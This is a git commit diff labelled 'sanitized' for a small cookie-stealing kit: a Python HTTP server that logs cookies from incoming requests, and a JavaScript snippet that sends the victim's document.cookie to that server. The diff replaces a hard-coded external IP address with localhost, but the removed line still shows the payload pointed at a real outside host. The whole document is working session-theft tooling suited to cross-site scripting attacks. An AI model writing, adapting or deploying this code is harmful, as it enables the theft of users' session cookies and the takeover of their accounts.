7c396d9361c4d79162ee00722ba0b609dba2343b
Parchaks <parchaks@protonmail.com>
2022-12-30 15:50:52 -0900

    sanitized

--- cookieserver.py
+++ cookieserver.py
@@ -1,5 +1,4 @@
 #!/bin/python
-#Modifed SimpleHTTPServer which returns cookies passed on the request
 
 from http import server 
 from http.cookies import SimpleCookie
@@ -10,7 +9,6 @@ port = 1234
 class MyHTTPRequestHandler(server.BaseHTTPRequestHandler):
     def do_GET(self):
         cookies = SimpleCookie(self.headers.get('Cookie'))
-#        print(f'{self.headers["Host"]} connected')
         with open('server.log','a') as f:
             f.write(f"\n {self.headers['Host']} : {cookies} \n")
         self.send_response(200)
--- sendcookies.js
+++ sendcookies.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'http://78.138.31.45:1234/?'+ document.cookie,  true);
+xhttp.open('GET', 'http://127.0.0.1:1234/?'+ document.cookie,  true);
 xhttp.send();
